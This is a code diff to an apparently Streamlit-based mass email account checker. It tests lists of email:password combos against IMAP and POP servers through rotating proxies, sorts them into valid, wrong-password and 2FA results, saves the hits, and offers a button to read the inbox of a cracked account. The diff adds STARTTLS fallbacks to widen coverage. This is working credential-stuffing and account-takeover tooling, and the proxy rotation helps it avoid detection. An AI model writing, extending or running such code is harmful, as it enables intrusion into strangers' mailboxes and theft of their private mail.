+        try_starttls = bool(CFG.get("TRY_STARTTLS", True))
+
         px = None
         if proxy_pool and proxy_mode != "off":
             if proxy_mode == "sticky":
@@ -1798,66 +1909,84 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 px = thread_state["sticky_proxy"]
             else:
                 px = sample_alive_proxy()
-        
-        current_px = None
+
         proxies_to_try = [px] if px else [None]
         if proxy_mode == "fallback" and px:
             proxies_to_try.append(None)
 
-        max_attempts = min(len(conf.get("imap", [])), 2)
+        max_attempts = max(1, min(len(conf.get("imap", []) or [""]), 2))
+        imap_hosts = [h for h in (conf.get("imap") or [])[:max_attempts] if h]
+        pop_hosts = [h for h in ((conf.get("pop") or conf.get("pop3") or [])[:max_attempts]) if h]
+
+        # --- Ordered ladder: implicit TLS first (most common), then STARTTLS ---
+        plan = []
+        for h in imap_hosts:
+            plan.append(("IMAP", h, 993, "ssl"))
+        if try_starttls:
+            for h in imap_hosts:
+                plan.append(("IMAP", h, 143, "starttls"))
+        for h in pop_hosts:
+            plan.append(("POP", h, 995, "ssl"))
+        if try_starttls:
+            for h in pop_hosts:
+                plan.append(("POP", h, 110, "starttls"))
+
+        if not plan:
+            trace_logs.append("No candidate hosts for this domain.")
+            return None, FAILED, "no candidate hosts", None, trace_logs
 
         for current_px in proxies_to_try:
             if current_px and any(bp in current_px for bp in bad_proxies):
                 continue
 
-            for server in conf.get("imap", [])[:max_attempts]:
-                trace_logs.append(f"{px_tag(current_px)} Attempting IMAP -> Host: {server}:993")
+            for proto, server, port, tls_mode in plan:
+                trace_logs.append(f"{px_tag(current_px)} Attempting {proto} {tls_mode.upper()} -> Host: {server}:{port}")
                 try:
-                    imap_once(email, password, server, current_px, insecure=prefer_insecure)
-                    trace_logs.append(f"{px_tag(current_px)} Post-auth IMAP inbox select verified OK")
+                    if proto == "IMAP":
+                        if tls_mode == "ssl":
+                            imap_once(email, password, server, current_px, insecure=prefer_insecure, port=port)
+                        else:
+                            imap_starttls_once(email, password, server, current_px, insecure=prefer_insecure, port=port)
+                    else:
+                        if tls_mode == "ssl":
+                            pop_once(email, password, server, current_px, insecure=prefer_insecure, port=port)
+                        else:
+                            pop_starttls_once(email, password, server, current_px, insecure=prefer_insecure, port=port)
+
                     record_proxy_attempt(current_px, success=True)
-                    return server, VALID, f"{px_tag(current_px)} IMAP | Host: {server} | Port: 993", current_px, trace_logs
-                except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
-                    st_val = classify_error(sock_err, domain)
-                    record_proxy_attempt(current_px, success=False, is_network_error=True)
-                    trace_logs.append(f"{px_tag(current_px)} -> SOCKET FAILED IMAP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
-                    if st_val in (WRONG, APP):
-                        return None, st_val, f"{px_tag(current_px)} IMAP {server} -> {st_val}", current_px, trace_logs
-                    continue
-                except Exception as e:
-                    st_val = classify_error(e, domain)
-                    is_net = (st_val == FAILED)
-                    record_proxy_attempt(current_px, success=False, is_network_error=is_net)
-                    trace_logs.append(f"{px_tag(current_px)} -> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
-                    if st_val in (WRONG, APP):
-                        return None, st_val, f"{px_tag(current_px)} IMAP {server} -> {st_val}", current_px, trace_logs
+                    trace_logs.append(f"{px_tag(current_px)} Post-auth {proto} verification OK on {server}:{port}")
+                    return server, VALID, f"{px_tag(current_px)} {proto} | Host: {server} | Port: {port}", current_px, trace_logs
+
+                except ssl.SSLError as ssl_err:
+                    st_val = classify_error(ssl_err, domain)
+                    record_proxy_attempt(current_px, success=False, is_network_error=(st_val == FAILED))
+                    trace_logs.append(f"{px_tag(current_px)} -> TLS FAILED {proto} {server}:{port}: {str(ssl_err)[:90]} [Classified: {st_val}]")
                     continue
 
-            for server in conf.get("pop", [])[:max_attempts]:
-                trace_logs.append(f"{px_tag(current_px)} Attempting POP -> Host: {server}:995")
-                try:
-                    pop_once(email, password, server, current_px, insecure=prefer_insecure)
-                    trace_logs.append(f"{px_tag(current_px)} Post-auth POP stat verified OK")
-                    record_proxy_attempt(current_px, success=True)
-                    return server, VALID, f"{px_tag(current_px)} POP | Host: {server} | Port: 995", current_px, trace_logs
-                except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
+                except (socket.timeout, socket.error, ConnectionRefusedError) as sock_err:
                     st_val = classify_error(sock_err, domain)
                     record_proxy_attempt(current_px, success=False, is_network_error=True)
-                    trace_logs.append(f"{px_tag(current_px)} -> SOCKET FAILED POP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
-                    if st_val in (WRONG, APP):
-                        return None, st_val, f"{px_tag(current_px)} POP {server} -> {st_val}", current_px, trace_logs
+                    trace_logs.append(f"{px_tag(current_px)} -> SOCKET FAILED {proto} {server}:{port}: {str(sock_err)[:90]} [Classified: {st_val}]")
                     continue
+
+                except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
+                    st_val = classify_error(proto_err, domain)
+                    record_proxy_attempt(current_px, success=False, is_network_error=False)
+                    trace_logs.append(f"{px_tag(current_px)} -> AUTH {proto} {server}:{port}: {str(proto_err)[:90]} [Classified: {st_val}]")
+                    if st_val in (WRONG, APP):
+                        return None, st_val, f"{px_tag(current_px)} {proto} {server} -> {st_val}", current_px, trace_logs
+                    continue
+
                 except Exception as e:
                     st_val = classify_error(e, domain)
-                    is_net = (st_val == FAILED)
-                    record_proxy_attempt(current_px, success=False, is_network_error=is_net)
-                    trace_logs.append(f"{px_tag(current_px)} -> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
+                    record_proxy_attempt(current_px, success=False, is_network_error=(st_val == FAILED))
+                    trace_logs.append(f"{px_tag(current_px)} -> FAILED {proto} {server}:{port}: {str(e)[:90]} [Classified: {st_val}]")
                     if st_val in (WRONG, APP):
-                        return None, st_val, f"{px_tag(current_px)} POP {server} -> {st_val}", current_px, trace_logs
+                        return None, st_val, f"{px_tag(current_px)} {proto} {server} -> {st_val}", current_px, trace_logs
                     continue
 
     except Exception as e:
-        trace_logs.append(f"{px_tag(current_px)} Critical Exception in runner: {str(e)}")
+        trace_logs.append(f"Critical Exception in runner: {str(e)}")
         if CFG.get("FAST_MODE", True):
             failed_domain_cache[domain] = time.time()
         return None, FAILED, str(e)[:40], None, trace_logs
@@ -1865,6 +1994,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
     if CFG.get("FAST_MODE", True):
         failed_domain_cache[domain] = time.time()
     return None, FAILED, "all hosts failed", None, trace_logs
+
 
 # --- Execution Trigger & Persistent UI Display ---
 str_lit.markdown("---")
@@ -1902,7 +2032,7 @@ if start_engine_btn:
     start_alive_refresher()
     refresh_alive_pool()
     log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode on category: [{engine_action_mode}].")
-    
+
     resume_lines = []
     if engine_action_mode == "Resume Unfinished" and unfinished_runs and unfinished_pick and unfinished_pick != "none saved":
         idx = [f"{r.get('saved_at','')} | {r.get('reason','stop')} | {r.get('checked',0)}/{r.get('total',0)}" for r in unfinished_runs].index(unfinished_pick)
@@ -1917,14 +2047,14 @@ if start_engine_btn:
         "Custom Filtered": custom_skipped,
         "DNS Failed": dns_skipped
     }
-    
+
     accounts_to_check = category_queue_map.get(engine_action_mode, [])
-    
+
     if not accounts_to_check:
         str_lit.warning(f"⚠ No accounts found in the selected category: '{engine_action_mode}'. Please load or choose another category.")
     else:
         active_proxy_pool = get_filtered_active_proxies()
-        
+
         with session_state_lock:
             existing_valid = load_persistent_valid_results()
             str_lit.session_state.valid_results = existing_valid
@@ -1937,23 +2067,23 @@ if start_engine_btn:
             str_lit.session_state.log_lines = []
             str_lit.session_state.checked_emails_set = set()
             str_lit.session_state.last_checked_index = 0
-                
+
             str_lit.session_state.engine_has_run = True
             str_lit.session_state.run_completion_status = "Unfinished"
-            
+
             start_dt = datetime.now()
             str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
             str_lit.session_state.end_timestamp = None
             str_lit.session_state.total_duration = None
-        
+
         progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
         status_text = str_lit.empty()
-        
+
         exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
-        
+
         with exec_tab1:
             log_container = str_lit.empty()
-        
+
         with exec_tab2:
             report_metrics_placeholder = str_lit.empty()
             report_log_container = str_lit.empty()
@@ -1963,10 +2093,10 @@ if start_engine_btn:
         total_accs = len(all_target_accounts)
         checked_count = 0
         thread_local = threading.local()
-        
+
         def check_task(line):
             try:
-                if ":" not in line: 
+                if ":" not in line:
                     return {"line": f"{line} | Error: Invalid format", "status": FAILED, "trace": ["Invalid format"]}
                 email, password = line.split(":", 1)
                 email, password = email.strip(), password.strip()
@@ -1975,10 +2105,10 @@ if start_engine_btn:
                     return {"line": f"{email}:{password} | {reason}", "email": email, "password": password, "status": SKIP, "detail": reason, "trace": [reason]}
                 domain = email.split("@")[-1].lower()
                 conf = get_servers(email)
-                
+
                 if not hasattr(thread_local, "state"):
                     thread_local.state = {}
-                
+
                 server, status, detail, px_used, trace = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
                 return {"line": f"{email}:{password} | {detail}", "email": email, "password": password, "status": status, "detail": detail, "trace": trace}
             except Exception as ex:
@@ -2002,7 +2132,7 @@ if start_engine_btn:
 
             with ThreadPoolExecutor(max_workers=current_workers) as executor:
                 future_to_line = {executor.submit(check_task, line): line for line in all_target_accounts}
-                
+
                 for index, future in enumerate(as_completed(future_to_line), 1):
                     checked_count += 1
                     try:
@@ -2010,7 +2140,7 @@ if start_engine_btn:
                         if res:
                             st_val = res["status"]
                             em_val = res.get('email', '').strip().lower()
-                            
+
                             with session_state_lock:
                                 if em_val:
                                     str_lit.session_state.checked_emails_set.add(em_val)
@@ -2026,12 +2156,12 @@ if start_engine_btn:
                                     str_lit.session_state.need_app_results.append(res["line"])
                                 else:
                                     str_lit.session_state.conn_results.append(res["line"])
-                                
+
                                 log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
                                 str_lit.session_state.log_lines.append(log_msg)
                                 if len(str_lit.session_state.log_lines) > 50:
                                     str_lit.session_state.log_lines.pop(0)
-                                
+
                                 trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
                                 cred_combo = f"{res.get('email', '')}:{res.get('password', '')}" if res.get('password') else res.get('email', '')
                                 str_lit.session_state.report_entries.append({
@@ -2052,7 +2182,7 @@ if start_engine_btn:
 
                             if index % 1 == 0 or checked_count == total_accs:
                                 log_container.code("\n".join(current_logs), language="text")
-                                
+
                                 with report_metrics_placeholder.container():
                                     r_col1, r_col2, r_col3, r_col4 = str_lit.columns(4)
                                     r_col1.metric("✅ Valid", valid_len)
@@ -2062,7 +2192,7 @@ if start_engine_btn:
 
                                 df_report = pd.DataFrame(current_reports[::-1])
                                 report_log_container.dataframe(df_report, use_container_width=True, height=300)
-                            
+
                     except Exception as ex:
                         err_msg = f"[EXCEPTION] {str(ex)}"
                         with session_state_lock:
@@ -2070,7 +2200,7 @@ if start_engine_btn:
                             str_lit.session_state.log_lines.append(err_msg)
                             current_logs = list(str_lit.session_state.log_lines)
                         log_container.code("\n".join(current_logs), language="text")
-                    
+
                     if checked_count % 5 == 0 or checked_count == total_accs:
                         with session_state_lock:
                             done = set(str_lit.session_state.checked_emails_set)
@@ -2135,7 +2265,7 @@ if start_engine_btn:
                 em = raw.split(":", 1)[0].strip().lower() if ":" in raw else raw
                 if em not in done:
                     left.append(raw)
-            
+
             if checked_count >= total_accs and not run_interrupted:
                 clear_unfinished()
             else:
@@ -2151,7 +2281,7 @@ if start_engine_btn:
             str_lit.session_state.run_completion_status = "Successful" if (checked_count >= total_accs and not run_interrupted) else "Unfinished"
             str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
             str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
-            
+
             valid_snapshot = list(str_lit.session_state.valid_results)
             wrong_snapshot = list(str_lit.session_state.wrong_results)
             need_snapshot = list(str_lit.session_state.need_app_results)
@@ -2160,7 +2290,7 @@ if start_engine_btn:
         progress_bar.progress(1.0, text="Checking complete!")
         status_text.success(f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}")
         log_startup(f"Live checking engine execution completed successfully. Duration: {str_lit.session_state.total_duration}")
-        
+
         try:
             stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
             valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
@@ -2258,7 +2388,7 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         duration_copy = str_lit.session_state.total_duration
 
     str_lit.markdown(f"### 📊 Live Results Summary & ZIP Archive — **{status_label}**")
-    
+
     if str_lit.session_state.run_completion_status == "Unfinished":
         unfinished_list = list_unfinished_runs()
         reason_text = "Unknown / Stopped manually or connection cut"
@@ -2273,13 +2403,13 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
 
     if start_ts_copy and end_ts_copy:
         str_lit.info(f"⏱ **Checking Session Timestamps:** Started at **{start_ts_copy}** | Ended at **{end_ts_copy}** | Total Duration: **{duration_copy}**")
-    
+
     col1, col2, col3, col4 = str_lit.columns(4)
     col1.metric("✅ Clean Valid", clean_count_val)
     col2.metric("❌ Wrong Password", wrong_len_val)
     col3.metric("🔑 App Password / 2FA", need_len_val)
     col4.metric("⚠ Connection Failed", conn_len_val)
-    
+
     if valid_res_copy:
         with str_lit.expander(f"✅ Valid Accounts Found ({len(valid_res_copy)})", expanded=False):
             for v in valid_res_copy:
@@ -2291,7 +2421,7 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
             str_lit.code("\n".join(log_lines_copy), language="text")
         else:
             str_lit.info("No logs available from previous run.")
-            
+
     with exec_tab2_p:
         if report_entries_copy:
             df_report_persisted = pd.DataFrame(report_entries_copy[::-1])
@@ -2330,7 +2460,7 @@ else:
     if valid_combo_options:
         selected_combo = str_lit.selectbox("Select Valid Account to Read:", options=valid_combo_options)
         max_msgs = str_lit.slider("Number of Recent Messages to Fetch", min_value=1, max_value=50, value=10, step=1)
-        
+
         if str_lit.button("📖 Read Inbox Messages"):
             if selected_combo:
                 parts = selected_combo.split(":", 1)
@@ -2338,9 +2468,9 @@ else:
                 acc_pass = parts[1].strip()
                 conf_servers = get_servers(acc_email)
                 imap_hosts = conf_servers.get("imap", [])
-                
+
                 mailbox_proxy = sample_alive_proxy() if use_proxy else None
-                
+
                 if not imap_hosts:
                     str_lit.error("No IMAP host available for this provider domain name.")
                 else:
@@ -2355,7 +2485,7 @@ else:
                                 break
                             elif msgs:
                                 fetched_msgs = msgs
-                        
+
                         if success_read:
                             str_lit.success("Successfully retrieved recent messages from mailbox!")
                             for idx, m_content in enumerate(fetched_msgs, 1):
